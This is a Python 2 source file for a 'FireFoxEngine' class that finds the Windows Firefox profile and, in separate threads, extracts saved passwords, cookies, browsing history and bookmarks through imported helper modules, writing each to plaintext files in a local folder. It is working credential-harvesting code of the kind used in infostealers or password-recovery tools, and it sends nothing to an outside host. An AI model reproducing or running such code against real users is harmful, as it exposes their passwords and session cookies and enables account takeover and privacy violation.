import firefoxHistory
import firefox_bookmarks
import firepwd
import firefox_cookie
import os
import threading
import usefull_things as ut
import datetime

class FireFoxEngine():
    def __init__(self):
        firefox_path = os.path.expanduser('~') + "\AppData\Roaming\Mozilla\Firefox\Profiles\\"
        if not ut.file_exists(firefox_path):
            self.is_valid = False
        else:
            self.is_valid = True
        if self.is_valid:
            self.dir_path = os.getcwd() + "/saved/Firefox/"
            print os.path.dirname(self.dir_path)
            if not os.path.exists(os.path.dirname(self.dir_path)):
                os.makedirs(os.path.dirname(self.dir_path))
            self.info_bank = {}

    def do(self, props):
        if props == 'all':
            t = threading.Thread(target=self.get_bookmarks)
            t.start()
            t = threading.Thread(target=self.get_cookies)
            t.start()
            t = threading.Thread(target=self.get_history)
            t.start()
            t = threading.Thread(target=self.get_saved_password)
            t.start()
        else:
            if props['Saved Passowrd']:
                t = threading.Thread(target=self.get_saved_password)
                t.start()

            if props['Bookmarks']:
                t = threading.Thread(target=self.get_bookmarks)
                t.start()
            if props['Cookies']:
                t = threading.Thread(target=self.get_cookies)
                t.start()
            if props['History']:
                t = threading.Thread(target=self.get_history)
                t.start()

    def get_bookmarks(self):
        info = firefox_bookmarks.bookmarks()
        if info[0] == 'err':
            st = ""
            for err in info[1:]:
                st += "-----------------\r\n" + str(datetime.datetime.now()) + "\r\n" + err.errs[err[0]] + " - " + err[1]
            f = open("logs/firefox_errros.txt",'a')
            f.write(st)
            f.close()
        else:
            self.info_bank['bookmarks'] = info[0]
            f = open(self.dir_path + 'bookmarks.txt','w')
            f.write(str(self.info_bank['bookmarks']))
            f.close()

    def get_history(self):
        info =  firefoxHistory.history()
        if info[0] == 'err':
            st = ""
            for err in info[1:]:
                st += "-----------------\r\n" + str(datetime.datetime.now()) + "\r\n" + err.errs[err[0]] + " - " + err[1]
            f = open("logs/firefox_errros.txt",'a')
            f.write(st)
            f.close()
        else:
            self.info_bank['history'] = info
            f = open(self.dir_path + 'history.txt','w')
            f.write(str(self.info_bank['history']))
            f.close()

    def get_saved_password(self):

        info = firepwd.get_saved_password()
        if info[0] == 'err':
            st = ""
            for err in info[1:]:
                st += "-----------------\r\n" + str(datetime.datetime.now()) + "\r\n" + err.errs[err[0]] + " - " + err[1]
            f = open("logs/firefox_errros.txt",'a')
            f.write(st)
            f.close()
        else:
            self.info_bank['passwords'] = info[0]
            f = open(self.dir_path + 'passwords.txt','w')
            f.write(str(self.info_bank['passwords']))
            f.close()

    def get_cookies(self):
        info =  firefox_cookie.get_all_cookies()
        if info[0] == 'err':
            st = ""
            for err in info[1:]:
                st += "-----------------\r\n" + str(datetime.datetime.now()) + "\r\n" + err.errs[err[0]] + " - " + err[1]
            f = open("logs/firefox_errros.txt",'a')
            f.write(st)
            f.close()
        else:
            self.info_bank['cookies'] = info
            f = open(self.dir_path + 'cookies.txt','w')
            f.write(str(self.info_bank['cookies']))
            f.close()